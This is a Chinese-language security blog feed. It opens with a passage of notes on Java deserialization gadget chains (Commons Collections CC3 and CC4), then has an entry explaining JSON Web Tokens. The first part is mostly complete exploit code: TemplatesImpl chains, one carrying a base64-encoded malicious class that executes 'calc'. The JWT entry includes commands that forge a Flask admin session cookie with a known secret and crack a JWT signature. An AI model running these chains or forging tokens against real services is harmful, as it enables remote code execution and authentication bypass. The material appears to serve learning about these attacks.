class="keyword">import</span> com.sun.org.apache.xml.internal.security.utils.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *                               基于LazyMap利用链的CC3链</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3Test2</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//构造恶意类并转换为字节码</span></span><br><span class="line">         <span class="type">byte</span>[] bytes=Base64.decode(<span class="string">&quot;yv66vgAAADQAMAoACwAcCgAdAB4IAB8KAB0AIAcAIQoABQAiBwAjBwAkCgAIACUHACYHACcBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQANU3RhY2tNYXBUYWJsZQcAJgcAIQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACkV4Y2VwdGlvbnMHACgBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIPGNsaW5pdD4HACMBAApTb3VyY2VGaWxlAQAWVGVzdFRlbXBsYXRlc0ltcGwuamF2YQwADAANBwApDAAqACsBAARjYWxjDAAsAC0BABNqYXZhL2xhbmcvRXhjZXB0aW9uDAAuAA0BABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAaamF2YS9sYW5nL1J1bnRpbWVFeGNlcHRpb24MAAwALwEAFUNDMi9UZXN0VGVtcGxhdGVzSW1wbAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAPcHJpbnRTdGFja1RyYWNlAQAYKExqYXZhL2xhbmcvVGhyb3dhYmxlOylWACEACgALAAAAAAAEAAEADAANAAEADgAAAGAAAgACAAAAFiq3AAG4AAISA7YABFenAAhMK7YABrEAAQAEAA0AEAAFAAIADwAAABoABgAAAA8ABAARAA0AFAAQABIAEQATABUAFQAQAAAAEAAC/wAQAAEHABEAAQcAEgQAAQATABQAAgAOAAAAGQAAAAMAAAABsQAAAAEADwAAAAYAAQAAACIAFQAAAAQAAQAWAAEAEwAXAAIADgAAABkAAAAEAAAAAbEAAAABAA8AAAAGAAEAAAAmABUAAAAEAAEAFgAIABgADQABAA4AAABUAAMAAQAAABe4AAISA7YABFenAA1LuwAIWSq3AAm/sQABAAAACQAMAAcAAgAPAAAAFgAFAAAAGAAJABsADAAZAA0AGgAWAB4AEAAAAAcAAkwHABkJAAEAGgAAAAIAGw==&quot;</span>);</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesImpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        setFieldValue(templatesImpl, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        setFieldValue(templatesImpl, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        <span class="comment">//构造利用链</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line"></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templatesImpl&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="comment">//触发利用链</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(map , chain);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">invocationHandler</span> <span class="operator">=</span> (InvocationHandler)constructor.newInstance(java.lang.annotation.Target.class, lazyMap);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMapProxy</span> <span class="operator">=</span> (Map)Proxy.newProxyInstance(Map.class.getClassLoader(),lazyMap.getClass().getInterfaces(),invocationHandler);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">instance</span> <span class="operator">=</span> constructor.newInstance(Target.class, lazyMapProxy);</span><br><span class="line">        <span class="comment">// 序列化与反序列化</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        oos.writeObject(instance);</span><br><span class="line">        oos.flush();</span><br><span class="line">        oos.close();</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(baos.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> (Object) ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">AnnotationInvocationHandler.readObject</span><br><span class="line"> <span class="title function_">Map</span><span class="params">(Proxy)</span>.entrySet()</span><br><span class="line">    AnnotationInvocationHandler.invoke()</span><br><span class="line">     lazyMap.get()</span><br><span class="line">           ChainedTransformer.transform()</span><br><span class="line">				ConstantTransformer.transform()</span><br><span class="line">							 InstantiateTransformer.tranform()</span><br><span class="line">								 </span><br><span class="line">TestTemplatesImpl-&gt;newTransformer()-&gt;getTransletInstance()-&gt;defineTransletClasses()+newInstance()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h1 id="基于hashMap"><a href="#基于hashMap" class="headerlink" title="基于hashMap"></a>基于hashMap</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> CC3;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> CC5.shell;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 用 CC6 链的前半部分链子</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3FinalEXP2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">templatesClass</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//byte[] evil = Files.readAllBytes(Paths.get(&quot;D:\\code\\javaweb\\cc1\\src\\main\\java\\CC3\\TemplatesImpl.class&quot;));</span></span><br><span class="line">        </span><br><span class="line">        <span class="type">byte</span>[] evil = shell.getTemplatesImpl(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;evil&#125;;</span><br><span class="line">        bytecodesField.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class), <span class="comment">// 构造 setValue 的可控参数</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="string">&quot;five&quot;</span>)); <span class="comment">// 防止在反序列化前弹计算器</span></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;key&quot;</span>);</span><br><span class="line">        HashMap&lt;Object, Object&gt; expMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        expMap.put(tiedMapEntry, <span class="string">&quot;value&quot;</span>);</span><br><span class="line">        lazyMap.remove(<span class="string">&quot;key&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 在 put 之后通过反射修改值</span></span><br><span class="line">        Class&lt;LazyMap&gt; lazyMapClass = LazyMap.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">factoryField</span> <span class="operator">=</span> lazyMapClass.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factoryField.set(lazyMap, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        serialize(expMap);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="CC4"><a href="#CC4" class="headerlink" title="CC4"></a>CC4</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cc;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.security.utils.Base64;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC4Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//构造核心利用代码</span></span><br><span class="line">        <span class="type">byte</span>[] bytes = Base64.decode(<span class="string">&quot;恶意类&quot;</span>);</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesImpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templatesImpl, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line">        setFieldValue(templatesImpl, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        <span class="comment">//构造利用链</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templatesImpl&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(chain);</span><br><span class="line">        <span class="comment">//触发利用链</span></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field2</span> <span class="operator">=</span> queue.getClass().getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">        field2.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field2.set(queue, comparator);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field3</span> <span class="operator">=</span> queue.getClass().getDeclaredField(<span class="string">&quot;queue&quot;</span>);</span><br><span class="line">        field3.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field3.set(queue, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templatesImpl, templatesImpl&#125;);</span><br><span class="line">        <span class="comment">//序列化  --&gt;  反序列化</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(queue);</span><br><span class="line">        oos.close();</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

















]]></content>
  </entry>
  <entry>
    <title>JWT</title>
    <url>/2023/03/14/JWT/</url>
    <content><![CDATA[<h2 id="1-JSON-Web-Token是什么"><a href="#1-JSON-Web-Token是什么" class="headerlink" title="1. JSON Web Token是什么"></a>1. JSON Web Token是什么</h2><p>JSON Web Token (JWT)是一个开放标准(RFC 7519)，它定义了一种紧凑的、自包含的方式，用于作为JSON对象在各方之间安全地传输信息。该信息可以被验证和信任，因为它是数字签名的。</p>
<h2 id="2-什么时候你应该用JSON-Web-Tokens"><a href="#2-什么时候你应该用JSON-Web-Tokens" class="headerlink" title="2. 什么时候你应该用JSON Web Tokens"></a>2. 什么时候你应该用JSON Web Tokens</h2><p>下列场景中使用JSON Web Token是很有用的：</p>
<ul>
<li><strong>Authorization</strong> (授权) : 这是使用JWT的最常见场景。一旦用户登录，后续每个请求都将包含JWT，允许用户访问该令牌允许的路由、服务和资源。单点登录是现在广泛使用的JWT的一个特性，因为它的开销很小，并且可以轻松地跨域使用。</li>
<li><strong>Information Exchange</strong> (信息交换) : 对于安全的在各方之间传输信息而言，JSON Web Tokens无疑是一种很好的方式。因为JWTs可以被签名，例如，用公钥&#x2F;私钥对，你可以确定发送人就是它们所说的那个人。另外，由于签名是使用头和有效负载计算的，您还可以验证内容没有被篡改。</li>
</ul>
<h2 id="3-JSON-Web-Token的结构是什么样的"><a href="#3-JSON-Web-Token的结构是什么样的" class="headerlink" title="3. JSON Web Token的结构是什么样的"></a>3. JSON Web Token的结构是什么样的</h2><img src="/2023/03/14/JWT/874963-20180709124807031-664967381.png" class="" title="img">

<p>JSON Web Token由三部分组成，它们之间用圆点(.)连接。这三部分分别是：</p>
<ul>
<li>Header</li>
<li>Payload</li>
<li>Signature</li>
</ul>
<p>因此，一个典型的JWT看起来是这个样子的：</p>
<p>xxxxx.yyyyy.zzzzz</p>
<p>接下来，具体看一下每一部分：</p>
<h3 id="Header"><a href="#Header" class="headerlink" title="Header"></a>Header</h3><p>header典型的由两部分组成：token的类型（“JWT”）和算法名称（比如：HMAC SHA256或者RSA等等）。</p>
<p>例如：</p>
<img src="/2023/03/14/JWT/874963-20180707143936465-1142974441.png" class="" title="img">

<p>然后，用Base64对这个JSON编码就得到JWT的第一部分</p>
<h3 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h3><p>JWT的第二部分是payload，它包含声明（要求）。声明是关于实体(通常是用户)和其他数据的声明。声明有三种类型: registered, public 和 private。</p>
<ul>
<li>Registered claims : 这里有一组预定义的声明，它们不是强制的，但是推荐。比如：iss (issuer), exp (expiration time), sub (subject), aud (audience)等。</li>
<li>Public claims : 可以随意定义。</li>
<li>Private claims : 用于在同意使用它们的各方之间共享信息，并且不是注册的或公开的声明。</li>
</ul>
<p>下面是一个例子：</p>
<img src="/2023/03/14/JWT/874963-20180707144153274-292205768.png" class="" title="img">

<p>对payload进行Base64编码就得到JWT的第二部分</p>
<p>注意，不要在JWT的payload或header中放置敏感信息，除非它们是加密的。</p>
<h3 id=""><a href="#" class="headerlink" title=""></a></h3><h3 id="Signature"><a href="#Signature" class="headerlink" title="Signature"></a>Signature</h3><p>为了得到签名部分，你必须有编码过的header、编码过的payload、一个秘钥，签名算法是header中指定的那个，然对它们签名即可。</p>
<p>例如：</p>
<p>HMACSHA256(base64UrlEncode(header) + “.” + base64UrlEncode(payload), secret)</p>
<p>签名是用于验证消息在传递过程中有没有被更改，并且，对于使用私钥签名的token，它还可以验证JWT的发送方是否为它所称的发送方。</p>
<h2 id="flask-session-cookie-manager使用"><a href="#flask-session-cookie-manager使用" class="headerlink" title="flask_session_cookie_manager使用"></a>flask_session_cookie_manager使用</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">python3 flask_session_cookie_manager3.py encode -s <span class="string">&#x27;tanji_is_A_boy_Yooooooooooooooooooooo!&#x27;</span> -t <span class="string">&#x27;&#123;&quot;isadmin&quot;:True&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$ &gt; ./jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.cAOIAifu3fykvhkHpbuhbvtH807-Z2rI1FS3vX1XMjE</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">有时候需要添加几个字符达成，猜测为6字符为一组解密为4字符</span><br></pre></td></tr></table></figure>

<img src="/2023/03/14/JWT/874963-20180707150229764-2037235703.png" class="" title="img">

<h2 id="4-JSON-Web-Tokens是如何工作的"><a href="#4-JSON-Web-Tokens是如何工作的" class="headerlink" title="4. JSON Web Tokens是如何工作的"></a>4. JSON Web Tokens是如何工作的</h2><p>在认证的时候，当用户用他们的凭证成功登录以后，一个JSON Web Token将会被返回。此后，token就是用户凭证了，你必须非常小心以防止出现安全问题。一般而言，你保存令牌的时候不应该超过你所需要它的时间。</p>
<p>无论何时用户想要访问受保护的路由或者资源的时候，用户代理（通常是浏览器）都应该带上JWT，典型的，通常放在Authorization header中，用Bearer schema。</p>
<p>header应该看起来是这样的：</p>
<p>Authorization: Bearer <token></p>
<p>服务器上的受保护的路由将会检查Authorization header中的JWT是否有效，如果有效，则用户可以访问受保护的资源。如果JWT包含足够多的必需的数据，那么就可以减少对某些操作的数据库查询的需要，尽管可能并不总是如此。</p>
<p>如果token是在授权头（Authorization header）中发送的，那么跨源资源共享(CORS)将不会成为问题，因为它不使用cookie。</p>
<p>下面这张图显示了如何获取JWT以及使用它来访问APIs或者资源：</p>
<img src="/2023/03/14/JWT/874963-20180707144719025-1833412608.png" class="" title="img">

<ol>
<li>应用（或者客户端）想授权服务器请求授权。例如，如果用授权码流程的话，就是&#x2F;oauth&#x2F;authorize</li>
<li>当授权被许可以后，授权服务器返回一个access token给应用</li>
<li>应用使用access token访问受保护的资源（比如：API）</li>
</ol>
<h2 id="5-基于Token的身份认证-与-基于服务器的身份认证"><a href="#5-基于Token的身份认证-与-基于服务器的身份认证" class="headerlink" title="5. 基于Token的身份认证 与 基于服务器的身份认证"></a>5. 基于Token的身份认证 与 基于服务器的身份认证</h2><h3 id="5-1-基于服务器的身份认证"><a href="#5-1-基于服务器的身份认证" class="headerlink" title="5.1. 基于服务器的身份认证"></a>5.1. 基于服务器的身份认证</h3><p>在讨论基于Token的身份认证是如何工作的以及它的好处之前，我们先来看一下以前我们是怎么做的：</p>
<blockquote>
<p>HTTP协议是无状态的，也就是说，如果我们已经认证了一个用户，那么他下一次请求的时候，服务器不知道我是谁，我们必须再次认证</p>
</blockquote>
<p>传统的做法是将已经认证过的用户信息存储在服务器上，比如Session。用户下次请求的时候带着Session ID，然后服务器以此检查用户是否认证过。</p>
<p>这种基于服务器的身份认证方式存在一些问题：</p>
<ul>
<li>Sessions : 每次用户认证通过以后，服务器需要创建一条记录保存用户信息，通常是在内存中，随着认证通过的用户越来越多，服务器的在这里的开销就会越来越大。</li>
<li>Scalability : 由于Session是在内存中的，这就带来一些扩展性的问题。</li>
<li>CORS : 当我们想要扩展我们的应用，让我们的数据被多个移动设备使用时，我们必须考虑跨资源共享问题。当使用AJAX调用从另一个域名下获取资源时，我们可能会遇到禁止请求的问题。</li>
<li>CSRF : 用户很容易受到CSRF攻击。</li>
</ul>
